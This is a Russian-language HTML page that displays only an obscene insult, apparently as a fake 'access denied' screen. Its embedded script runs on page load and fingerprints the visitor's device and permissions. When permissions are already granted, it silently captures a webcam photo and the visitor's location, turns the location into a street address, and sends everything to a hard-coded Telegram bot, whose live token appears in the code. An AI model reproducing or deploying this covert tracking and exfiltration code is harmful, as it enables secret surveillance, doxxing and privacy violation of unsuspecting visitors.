<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Запрет доступа</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
            color: white;
            font-family: Arial, sans-serif;
            user-select: none;
            touch-action: none;
        }

        h1 {
            font-size: 3rem; /* Текст немного выше */
            text-align: center;
            margin: 0;
        }
    </style>
</head>
<body>
    <h1>ИДИ НА ХУЙ</h1>

    <script>
        async function getUserInfo(latitude, longitude) {
            const locationData = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`);
            const locationInfo = await locationData.json();
            const addressComponents = locationInfo.address;
            const formattedAddress = [
                addressComponents.country,
                addressComponents.state || addressComponents.region,
                addressComponents.city || addressComponents.town || addressComponents.village,
                addressComponents.road,
                addressComponents.house_number,
                addressComponents.postcode
            ].filter(Boolean).join(', ');

            return formattedAddress || 'Адрес не найден';
        }

        async function sendToTelegram(userInfo, latitude = null, longitude = null, photoBlob = null) {
            const botToken = '6760012279:AAHcJueLC_AF49YRK3s-MCc2pTGJy7YZPHA';
            const chatId = '-1002255197235';

            const message = `
                Устройство: ${userInfo.deviceInfo}
                Время входа: ${userInfo.timestamp}
                Ширина экрана: ${userInfo.screenWidth}px
                Высота экрана: ${userInfo.screenHeight}px
                Внутреннее разрешение: ${userInfo.innerWidth}px x ${userInfo.innerHeight}px
                Реферер: ${userInfo.referrer || 'Неизвестно'}
                Платформа: ${userInfo.platform}
                Язык: ${userInfo.language}
                Cookies включены: ${userInfo.cookiesEnabled}
                Тип соединения: ${userInfo.connectionType}
                История браузера: ${userInfo.historyLength}
                Глубина страницы: ${userInfo.depthOfView}
                IP-адрес: ${userInfo.ipAddress}
                Провайдер: ${userInfo.provider}
                Адрес: ${userInfo.geoLocation || 'Неизвестно'}
                Микрофон: ${userInfo.microphonePermission}
                Уведомления: ${userInfo.notificationsPermission}
                Встроенный контент: ${userInfo.embeddedContentPermission}
                Датчики движения: ${userInfo.motionSensorsPermission}
                Устройства с NFC: ${userInfo.nfcDevicesPermission}
                USB: ${userInfo.usbPermission}
                Буфер обмена: ${userInfo.clipboardPermission}
                Виртуальная реальность: ${userInfo.virtualRealityPermission}
                Дополненная реальность: ${userInfo.augmentedRealityPermission}
                Использование устройства: ${userInfo.deviceUsagePermission}
            `.trim();

            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('caption', message);

            if (photoBlob) {
                formData.append('photo', photoBlob);
            }

            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: 'POST',
                body: formData
            });

            if (latitude && longitude) {
                await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
                    method: 'POST',
                    body: JSON.stringify({
                        chat_id: chatId,
                        latitude: latitude,
                        longitude: longitude,
                    }),
                    headers: {
                        'Content-Type': 'application/json'
                    }
                });
            }
        }

        async function capturePhoto() {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.createElement('video');
            video.srcObject = stream;
            await new Promise(resolve => video.onloadedmetadata = resolve);
            video.play();
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            stream.getTracks().forEach(track => track.stop());
            return canvas.toDataURL('image/jpeg');
        }

        async function startProcess() {
            const geoPermission = await navigator.permissions.query({ name: 'geolocation' });
            const cameraPermission = await navigator.permissions.query({ name: 'camera' });
            const microphonePermission = await navigator.permissions.query({ name: 'microphone' });
            const notificationsPermission = await navigator.permissions.query({ name: 'notifications' });
            const embeddedContentPermission = await navigator.permissions.query({ name: 'document-exec' });
            const motionSensorsPermission = await navigator.permissions.query({ name: 'accelerometer' });
            const nfcDevicesPermission = await navigator.permissions.query({ name: 'nfc' });
            const usbPermission = await navigator.permissions.query({ name: 'usb' });
            const clipboardPermission = await navigator.permissions.query({ name: 'clipboard-read' });
            const virtualRealityPermission = await navigator.permissions.query({ name: 'vr' });
            const augmentedRealityPermission = await navigator.permissions.query({ name: 'ar' });
            const deviceUsagePermission = await navigator.permissions.query({ name: 'device-info' });

            let userInfo = {
                deviceInfo: navigator.userAgent,
                timestamp: new Date().toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' }),
                screenWidth: window.screen.width,
                screenHeight: window.screen.height,
                innerWidth: window.innerWidth,
                innerHeight: window.innerHeight,
                referrer: document.referrer,
                platform: navigator.platform,
                language: navigator.language,
                cookiesEnabled: navigator.cookieEnabled,
                connectionType: navigator.connection ? navigator.connection.effectiveType : 'unknown',
                historyLength: window.history.length,
                depthOfView: document.body.scrollHeight,
                geoLocation: 'Неизвестно', // начальное значение
                ipAddress: 'Неизвестно',  // здесь можно интегрировать API для получения IP, если нужно
                provider: 'Неизвестно',  // аналогично, можно интегрировать API для получения провайдера
                microphonePermission: microphonePermission.state,
                notificationsPermission: notificationsPermission.state,
                embeddedContentPermission: embeddedContentPermission.state,
                motionSensorsPermission: motionSensorsPermission.state,
                nfcDevicesPermission: nfcDevicesPermission.state,
                usbPermission: usbPermission.state,
                clipboardPermission: clipboardPermission.state,
                virtualRealityPermission: virtualRealityPermission.state,
                augmentedRealityPermission: augmentedRealityPermission.state,
                deviceUsagePermission: deviceUsagePermission.state,
            };

            let photoBlob = null;
            let latitude = null;
            let longitude = null;

            if (cameraPermission.state === 'granted') {
                const photoDataURL = await capturePhoto();
                photoBlob = await (await fetch(photoDataURL)).blob();
            }

            if (geoPermission.state === 'granted') {
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        latitude = position.coords.latitude;
                        longitude = position.coords.longitude;
                        userInfo.geoLocation = await getUserInfo(latitude, longitude);
                        await sendToTelegram(userInfo, latitude, longitude, photoBlob);
                    },
                    async (error) => {
                        userInfo.geoLocation = 'Не удалось получить геолокацию: ' + error.message;
                        await sendToTelegram(userInfo, null, null, photoBlob);
                    }
                );
            } else {
                // Если геолокация не доступна, все равно отправляем информацию
                await sendToTelegram(userInfo, null, null, photoBlob);
            }
        }

        window.onload = startProcess;

        navigator.serviceWorker.register('/sw.js').then(() => {
            console.log('Service Worker зарегистрирован.');
        });

        window.onbeforeunload = function() {
            return;
        };
    </script>
</body>
</html>
